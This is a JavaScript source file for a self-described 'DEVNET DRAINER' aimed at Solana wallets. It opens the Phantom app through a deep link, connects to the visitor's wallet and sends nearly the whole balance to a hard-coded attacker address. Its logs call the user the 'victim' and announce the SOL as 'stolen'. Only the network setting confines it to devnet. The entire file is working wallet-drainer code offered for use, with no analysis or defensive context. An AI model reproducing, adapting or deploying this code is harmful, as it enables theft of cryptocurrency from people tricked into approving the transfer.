/**
 * DEVNET DRAINER - Opens Phantom app from Chrome/Safari
 * Works on mobile - deep link opens app, then drains
 */

// ============================================
// 🔧 CONFIGURATION - EDIT THESE 🔧
// ============================================
const YOUR_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
// Example: "9x4e9wXHvE9P9yXxR4R9qXxXxXxXxXxXxXxXxXxX"
// ============================================

let transactionLog = [];
let drainExecuted = false;
let currentUrl = window.location.href;

// Display target address
document.getElementById('targetAddr').innerText = YOUR_WALLET;

// Add log function
function addLog(msg, type = 'wait') {
    transactionLog.unshift({ msg, type, time: new Date().toLocaleTimeString() });
    if (transactionLog.length > 30) transactionLog.pop();
    const logDiv = document.getElementById('log');
    if (logDiv) {
        logDiv.innerHTML = transactionLog.map(l => 
            `<div class="log-entry ${l.type}">[${l.time}] ${l.msg}</div>`
        ).join('');
    }
}

// 🔥 STEP 1: Open Phantom app via deep link
function openPhantomApp() {
    addLog('🦊 Opening Phantom app...', 'wait');
    
    // Store drain info before redirecting
    localStorage.setItem('drainPending', 'true');
    localStorage.setItem('drainRecipient', YOUR_WALLET);
    localStorage.setItem('returnUrl', currentUrl);
    
    // Deep link that opens Phantom app
    const encodedUrl = encodeURIComponent(currentUrl);
    const deepLink = `phantom://browse?url=${encodedUrl}`;
    
    // Redirect to Phantom app
    window.location.href = deepLink;
    
    // Fallback if app not installed
    setTimeout(() => {
        if (!drainExecuted) {
            addLog('⚠️ Phantom not installed? Opening App Store', 'error');
            window.location.href = 'https://phantom.app/';
        }
    }, 2000);
}

// 🔥 STEP 2: Execute drain when returning from app
async function executeDrain() {
    if (drainExecuted) return;
    
    addLog('✅ Returned from Phantom app!', 'success');
    addLog('🔄 Connecting to wallet...', 'wait');
    
    try {
        // Get Phantom provider (now should be available)
        const provider = getPhantomProvider();
        
        if (!provider) {
            addLog('❌ Phantom not detected. Please open from Phantom app browser.', 'error');
            return;
        }
        
        // Connect
        const resp = await provider.connect();
        const victimAddress = resp.publicKey.toString();
        addLog(`✅ Victim wallet: ${victimAddress.substring(0, 25)}...`, 'success');
        
        // Initialize Solana connection
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('devnet'),
            'confirmed'
        );
        
        // Get balance
        const pubKey = new solanaWeb3.PublicKey(victimAddress);
        const balance = await connection.getBalance(pubKey);
        const balanceSol = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        addLog(`💰 Balance: ${balanceSol.toFixed(5)} DEVNET SOL`, 'wait');
        
        if (balanceSol < 0.01) {
            addLog(`⚠️ No SOL to drain`, 'error');
            return;
        }
        
        // Calculate amount (leave tiny for fees)
        const amountToDrain = balanceSol - 0.001;
        
        addLog(`💀 Draining ${amountToDrain.toFixed(5)} SOL...`, 'drain');
        
        // Create transaction
        const toPubkey = new solanaWeb3.PublicKey(YOUR_WALLET);
        const fromPubkey = new solanaWeb3.PublicKey(victimAddress);
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToDrain * solanaWeb3.LAMPORTS_PER_SOL
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        addLog(`⏳ Waiting for victim approval...`, 'wait');
        
        // Send transaction - this will open Phantom again
        const signature = await provider.signAndSendTransaction(transaction);
        
        addLog(`✅ DRAIN SENT!`, 'drain');
        addLog(`🔑 ${signature.substring(0, 40)}...`, 'success');
        
        // Confirm
        await connection.confirmTransaction(signature, 'confirmed');
        
        addLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(5)} SOL stolen!`, 'drain');
        addLog(`📍 Sent to: ${YOUR_WALLET.substring(0, 30)}...`, 'success');
        
        drainExecuted = true;
        
        const btn = document.getElementById('drainBtn');
        if (btn) {
            btn.disabled = true;
            btn.textContent = '✅ DRAINED!';
        }
        
        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${YOUR_WALLET.substring(0, 40)}...`);
        
    } catch (error) {
        addLog(`❌ Failed: ${error.message}`, 'error');
        console.error(error);
    }
}

// Get Phantom provider (works on mobile after app opens)
function getPhantomProvider() {
    if (window.solana && window.solana.isPhantom) {
        return window.solana;
    }
    if (window.phantom?.solana) {
        return window.phantom.solana;
    }
    return null;
}

// 🔥 STEP 3: Check if returning from Phantom app
function checkForReturn() {
    const pending = localStorage.getItem('drainPending');
    
    if (pending === 'true') {
        localStorage.removeItem('drainPending');
        addLog('🔄 Returning from Phantom...', 'wait');
        
        // Wait for page to fully load and provider to be available
        setTimeout(() => {
            executeDrain();
        }, 1500);
    }
}

// Button click handler
document.getElementById('drainBtn')?.addEventListener('click', () => {
    if (drainExecuted) {
        addLog('Already drained!', 'error');
        return;
    }
    openPhantomApp();
});

// Check if returning from app
checkForReturn();